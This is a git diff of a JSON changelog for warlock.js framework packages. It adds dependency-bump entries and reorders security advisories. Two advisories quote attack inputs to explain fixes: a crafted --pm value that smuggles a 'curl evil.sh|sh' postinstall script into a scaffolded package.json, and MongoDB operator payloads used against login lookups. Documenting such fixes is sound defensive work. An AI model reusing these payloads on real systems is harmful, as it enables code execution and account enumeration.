@@ -212,11 +212,15 @@
         {
           "name": "@warlock.js/core",
           "slug": "core",
-          "total": 2,
+          "total": 5,
           "counts": [
             {
               "type": "Security",
               "n": 2
+            },
+            {
+              "type": "Dependencies",
+              "n": 3
             }
           ],
           "items": [
@@ -227,17 +231,33 @@
             {
               "type": "Security",
               "html": "<strong><code>http.trustProxy</code> now accepts a hop count or a trusted-proxy list, and <code>detectIp()</code> honours them.</strong> <code>true</code> is the wrong shape for the common topology: an edge that *appends* to <code>X-Forwarded-For</code> leaves whatever the client prepended as the leftmost entry, so \"trust the leftmost hop\" hands the client its own IP back. The config value is passed to Fastify untouched, and <code>detectIp()</code> now reads the resolved client off <code>request.ip</code> instead of re-parsing the header — so both agree, and every Fastify shape works:"
+            },
+            {
+              "type": "Dependencies",
+              "html": "Bumped <code>@mongez/*</code> deps to their 2026-08-17 security release specs: <code>concat-route</code> ^1.2.0, <code>config</code> ^1.2.1, <code>dotenv</code> ^1.3.2, <code>events</code> ^2.2.7, <code>http</code> ^3.5.0, <code>localization</code> ^3.4.7, <code>reinforcements</code> ^4.0.1, <code>supportive-is</code> ^2.1.4"
+            },
+            {
+              "type": "Dependencies",
+              "html": "⚠ <strong><code>@mongez/reinforcements</code> 4.0.1 is a major bump: <code>Random</code> is now CSPRNG-backed (WebCrypto) and <code>Random.seed()</code> was removed</strong> — seeded/reproducible <code>Random.string/nanoid/id/token/uuid</code> calls now throw. Audited <code>core</code>'s <code>Random.string(...)</code> call sites (<code>use-case.ts</code>, <code>http/request.ts</code>, <code>dev-server/files-watcher.ts</code>, <code>http/uploaded-file.ts</code>) and its test suite: none rely on seeding or reproducible output, so no code changes were required"
+            },
+            {
+              "type": "Dependencies",
+              "html": "<code>@mongez/encryption</code> 2.0.1 (async <code>encrypt</code>/<code>decrypt</code>, throws on failure) does not apply to this package — <code>core</code> is not a consumer; <code>src/encryption/encrypt.ts</code> uses Node's built-in <code>crypto</code> module directly and is unaffected"
             }
           ]
         },
         {
           "name": "@warlock.js/cache",
           "slug": "cache",
-          "total": 6,
+          "total": 7,
           "counts": [
             {
               "type": "Security",
               "n": 6
+            },
+            {
+              "type": "Dependencies",
+              "n": 1
             }
           ],
           "items": [
@@ -264,6 +284,10 @@
             {
               "type": "Security",
               "html": "<strong>File driver <code>removeNamespace</code> dotted-key gap (Medium):</strong> dotted keys (<code>ns.a</code>) are stored as *sibling* directories under the cache root (see the path-traversal fix above), so removing namespace <code>ns</code> — which only ever deleted a directory literally named <code>ns</code> — silently left every <code>ns.*</code> key on disk. <code>removeNamespace</code> now lists the cache root's immediate children, decodes each back to its logical key, and removes every directory whose logical key equals the namespace or starts with <code>&lt;namespace&gt;.</code>, matching the boundary semantics the <code>pg</code> driver already used for the same contract. Honors <code>globalPrefix</code> (previously ignored, so a global flush could wipe the whole cache root instead of scoping to the tenant) and preserves the existing path-containment guard."
+            },
+            {
+              "type": "Dependencies",
+              "html": "Bumped <code>@mongez/reinforcements</code> to <code>^4.0.1</code>. The major makes <code>Random.string/nanoid/id/token/uuid</code> CSPRNG-backed (WebCrypto) and removes <code>Random.seed()</code> support; audited this package's source and tests for <code>Random.seed(</code> and for seeded/reproducible use of <code>Random.*</code>, no hits, so no code changes were needed."
             }
           ]
         },
@@ -299,11 +323,15 @@
         {
           "name": "@warlock.js/herald",
           "slug": "herald",
-          "total": 3,
+          "total": 4,
           "counts": [
             {
               "type": "Security",
               "n": 3
+            },
+            {
+              "type": "Dependencies",
+              "n": 1
             }
           ],
           "items": [
@@ -318,13 +346,17 @@
             {
               "type": "Security",
               "html": "<strong>Broker credentials no longer leak into thrown/logged connection errors.</strong> <code>username</code>/<code>password</code> are now URI-encoded when building the <code>amqp://</code> URL (a reserved character like <code>@</code>/<code>:</code>/<code>/</code> in a generated secret previously produced a malformed URL whose parser error echoed the raw credential back), and any error surfaced from <code>connect()</code> — including one that embeds a caller-supplied <code>uri</code> with credentials — has <code>user:pass@</code> redacted before it's re-thrown, so a connection failure can no longer put a plaintext broker password in front of <code>console.error</code>/structured logging/an error tracker"
+            },
+            {
+              "type": "Dependencies",
+              "html": "Bumped <code>@mongez/events</code> to <code>^2.2.7</code> (no breaking changes) and <code>@mongez/reinforcements</code> to <code>^4.0.1</code>. The reinforcements major makes <code>Random.string/nanoid/id/token/uuid</code> CSPRNG-backed (WebCrypto) and removes <code>Random.seed()</code> support — audited this package's source and tests for <code>Random.seed(</code> and for seeded/reproducible use of <code>Random.*</code>; none found, so no code changes were needed."
             }
           ]
         },
         {
           "name": "@warlock.js/logger",
           "slug": "logger",
-          "total": 3,
+          "total": 4,
           "counts": [
             {
               "type": "Fixed",
@@ -332,6 +364,10 @@
             },
             {
               "type": "Security",
+              "n": 1
+            },
+            {
+              "type": "Dependencies",
               "n": 1
             }
           ],
@@ -347,6 +383,43 @@
             {
               "type": "Security",
               "html": "<strong>Secrets are now redacted by default. This is a behavior change — logs that previously showed these values in cleartext will now show <code>[REDACTED]</code>.</strong> Redaction used to be a *tool* (<code>redact.paths</code>, entirely opt-in): unless an application configured it, a <code>password</code> in <code>context</code>, an <code>authorization</code> header, or an <code>apiKey</code> on a logged <code>Error</code> reached every sink — console, log file, JSON log file, Sentry — verbatim. Protection existed only where every call site had been configured correctly, with no signal when one hadn't. It is now a *default*."
+            },
+            {
+              "type": "Dependencies",
+              "html": "Bumped <code>@mongez/reinforcements</code> to <code>^4.0.1</code>. The major makes <code>Random.string/nanoid/id/token/uuid</code> CSPRNG-backed (WebCrypto) and removes <code>Random.seed()</code> support. This package uses <code>Random.string(32)</code> only for the non-security <code>logger-&lt;id&gt;</code> instance identifier; audited for <code>Random.seed(</code> with no hits, so no code changes were needed."
+            }
+          ]
+        },
+        {
+          "name": "create-warlock",
+          "slug": "create-warlock",
+          "total": 4,
+          "counts": [
+            {
+              "type": "Security",
+              "n": 1
+            },
+            {
+              "type": "Dependencies",
+              "n": 3
+            }
+          ],
+          "items": [
+            {
+              "type": "Security",
+              "html": "<strong><code>--pm</code> is now validated against an allow-list (<code>npm</code>/<code>yarn</code>/<code>pnpm</code>/<code>bun</code>) before it reaches anything.</strong> Previously an arbitrary <code>--pm</code> string flowed straight into <code>spawn()</code> as the executable to run *and* was spliced verbatim into the generated <code>package.json</code>'s script text before that text is parsed as JSON — a crafted value (e.g. <code>--pm='pnpm\",\"postinstall\":\"curl${IFS}evil.sh|sh#'</code>) could inject a <code>postinstall</code> script that the scaffolder's own automatic <code>install()</code> step would then execute, or invoke an arbitrary binary on <code>PATH</code> outright. <code>--yes</code>/non-interactive scaffolds now reject any <code>--pm</code> outside the allow-list and exit before the package manager is set, closing both sinks at the source; the interactive prompt was already safe (its options are drawn from the allow-list, never free text)."
+            },
+            {
+              "type": "Dependencies",
+              "html": "Bumped <code>@mongez/reinforcements</code> to <code>^4.0.1</code> (package dependency + project template). This is a <strong>major</strong> bump: <code>Random.string/nanoid/id/token/uuid</code> are now CSPRNG-backed (WebCrypto) and no longer honor <code>Random.seed()</code>, and throw without WebCrypto available. Audited <code>create-warlock</code>'s own source and the <code>templates/warlock</code> scaffold for <code>Random.seed</code>/<code>Random.*</code> usage — none found, no code changes required."
+            },
+            {
+              "type": "Dependencies",
+              "html": "Project template (<code>templates/warlock/package.json</code>) <code>@mongez/*</code> deps bumped: <code>@mongez/localization</code> to <code>^3.4.7</code>, <code>@mongez/supportive-is</code> to <code>^2.1.4</code>, <code>@mongez/agent-kit</code> to <code>^1.2.1</code>."
+            },
+            {
+              "type": "Dependencies",
+              "html": "Project template <code>@warlock.js/*</code> deps were pinned at the stale <code>4.0.119</code> — rewritten to the current lockstep version <code>4.15.0</code> to match the published <code>@warlock.js/*</code> packages."
             }
           ]
         },
@@ -389,6 +462,56 @@
             {
               "type": "Security",
               "html": "<strong>New <code>allowPrivateNetwork</code> option (default <code>false</code>) on both tools</strong> for the deliberate case of a tool that must call an internal service (e.g. a local dev server); <code>allowHosts</code> still works and now also constrains redirect targets"
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/auth",
+          "slug": "auth",
+          "total": 2,
+          "counts": [
+            {
+              "type": "Security",
+              "n": 1
+            },
+            {
+              "type": "Dependencies",
+              "n": 1
+            }
+          ],
+          "items": [
+            {
+              "type": "Security",
+              "html": "<strong>Login credential lookups are no longer vulnerable to NoSQL operator injection.</strong> <code>authService.attemptLogin</code> forwards the request's credential fields (e.g. <code>email</code>, <code>phoneNumber</code>) into <code>Model.first(...)</code> to find the user, so a caller that passed request JSON straight through could smuggle a MongoDB operator object — <code>{ email: { $ne: null } }</code>, <code>{ email: { $regex: \"^a\" } }</code> — into the user-lookup filter, breaking its intended equality semantics and enabling account enumeration / targeted-lookup attacks (the password is still verified separately with bcrypt, so this was never a full bypass on its own). The fix lands in <code>@warlock.js/cascade</code> 4.16.0, whose query builder now rejects <code>$</code>-prefixed keys in equality position (<code>UnsafeFilterError</code>); because <code>attemptLogin</code>'s lookup routes through cascade, upgrading the family to 4.16.0 closes this with no change to your auth code. If you build user lookups by hand, keep passing scalars — or use the explicit operator API — rather than forwarding raw request objects."
+            },
+            {
+              "type": "Dependencies",
+              "html": "Bumped <code>@mongez/events</code> to <code>^2.2.7</code> (no breaking changes) and <code>@mongez/reinforcements</code> to <code>^4.0.1</code>. The reinforcements major makes <code>Random.string/nanoid/id/token/uuid</code> CSPRNG-backed (WebCrypto) and removes <code>Random.seed()</code> support. This package calls <code>Random.string(32)</code> (device <code>familyId</code> fallback) and <code>Random.token(32)</code> (JWT secret generation) — both are exactly the security-sensitive uses the CSPRNG backing is meant to strengthen, and neither relied on seeding; audited for <code>Random.seed(</code> with no hits, so no code changes were needed."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/seal",
+          "slug": "seal",
+          "total": 2,
+          "counts": [
+            {
+              "type": "Security",
+              "n": 1
+            },
+            {
+              "type": "Dependencies",
+              "n": 1
+            }
+          ],
+          "items": [
+            {
+              "type": "Security",
+              "html": "<strong>Renamed <code>safeHtmlMutator</code>/<code>.safeHtml()</code> to <code>stripTagsMutator</code>/<code>.stripTags()</code>.</strong> The old name implied XSS safety it never provided — the implementation is a naive <code>&lt;[^&gt;]*&gt;</code> regex, not an HTML parser, and can be defeated by malformed/nested markup or content re-introduced later in a pipeline. A developer building <code>v.string().safeHtml()</code> for user-supplied rich text was liable to treat the output as pre-sanitized and skip further output encoding, opening a stored/reflected XSS path. The new names and doc comments make clear this is tag-stripping only; use a real parser-based sanitizer (DOMPurify / sanitize-html) for untrusted rich text. <code>safeHtmlMutator</code> and <code>.safeHtml()</code> remain as deprecated aliases (same behavior, <code>@deprecated</code> JSDoc pointing at the new names) so existing callers do not break."
+            },
+            {
+              "type": "Dependencies",
+              "html": "Bumped <code>@mongez/supportive-is</code> to <code>^2.1.4</code> (no breaking changes) and <code>@mongez/reinforcements</code> to <code>^4.0.1</code>. The reinforcements major makes <code>Random.string/nanoid/id/token/uuid</code> CSPRNG-backed (WebCrypto) and removes <code>Random.seed()</code> support — audited this package's source and tests for <code>Random.seed(</code> and for seeded/reproducible use of <code>Random.*</code>; none found, so no code changes were needed."
             }
           ]
         },
@@ -459,47 +582,6 @@
               "html": "<code>BaseNotificationsRepository.createFor</code> no longer lets the channel payload override server-owned row keys. The payload was spread after the trusted <code>recipientId</code>, so an untyped caller (e.g. a payload assembled from request JSON, or <code>notify.channel(name).send</code>) carrying a <code>recipientId</code> key — or the model's physical recipient column name — could write the notification into another recipient's inbox, contradicting the recipient-scoping guarantee. Server-owned keys (<code>id</code>, <code>recipientId</code>, <code>tenant</code>, <code>readAt</code>, <code>isRead</code>, and their resolved physical columns) are now stripped from the payload at runtime and the trusted arguments are applied last; legitimate fields (<code>type</code>, <code>title</code>, <code>body</code>, <code>payload</code>, <code>idempotencyKey</code>) pass through unchanged. <code>createManyFor</code> inherits the fix."
             }
           ]
-        },
-        {
-          "name": "@warlock.js/seal",
-          "slug": "seal",
-          "total": 1,
-          "counts": [
-            {
-              "type": "Security",
-              "n": 1
-            }
-          ],
-          "items": [
-            {
-              "type": "Security",
-              "html": "<strong>Renamed <code>safeHtmlMutator</code>/<code>.safeHtml()</code> to <code>stripTagsMutator</code>/<code>.stripTags()</code>.</strong> The old name implied XSS safety it never provided — the implementation is a naive <code>&lt;[^&gt;]*&gt;</code> regex, not an HTML parser, and can be defeated by malformed/nested markup or content re-introduced later in a pipeline. A developer building <code>v.string().safeHtml()</code> for user-supplied rich text was liable to treat the output as pre-sanitized and skip further output encoding, opening a stored/reflected XSS path. The new names and doc comments make clear this is tag-stripping only; use a real parser-based sanitizer (DOMPurify / sanitize-html) for untrusted rich text. <code>safeHtmlMutator</code> and <code>.safeHtml()</code> remain as deprecated aliases (same behavior, <code>@deprecated</code> JSDoc pointing at the new names) so existing callers do not break."
-            }
-          ]
-        },
-        {
-          "name": "create-warlock",
-          "slug": "create-warlock",
-          "total": 1,
-          "counts": [
-            {
-              "type": "Security",
-              "n": 1
-            }
-          ],
-          "items": [
-            {
-              "type": "Security",
-              "html": "<strong><code>--pm</code> is now validated against an allow-list (<code>npm</code>/<code>yarn</code>/<code>pnpm</code>/<code>bun</code>) before it reaches anything.</strong> Previously an arbitrary <code>--pm</code> string flowed straight into <code>spawn()</code> as the executable to run *and* was spliced verbatim into the generated <code>package.json</code>'s script text before that text is parsed as JSON — a crafted value (e.g. <code>--pm='pnpm\",\"postinstall\":\"curl${IFS}evil.sh|sh#'</code>) could inject a <code>postinstall</code> script that the scaffolder's own automatic <code>install()</code> step would then execute, or invoke an arbitrary binary on <code>PATH</code> outright. <code>--yes</code>/non-interactive scaffolds now reject any <code>--pm</code> outside the allow-list and exit before the package manager is set, closing both sinks at the source; the interactive prompt was already safe (its options are drawn from the allow-list, never free text)."
-            }
-          ]
-        },
-        {
-          "name": "@warlock.js/auth",
-          "slug": "auth",
-          "total": 0,
-          "counts": [],
-          "items": []
         }
       ]
     },
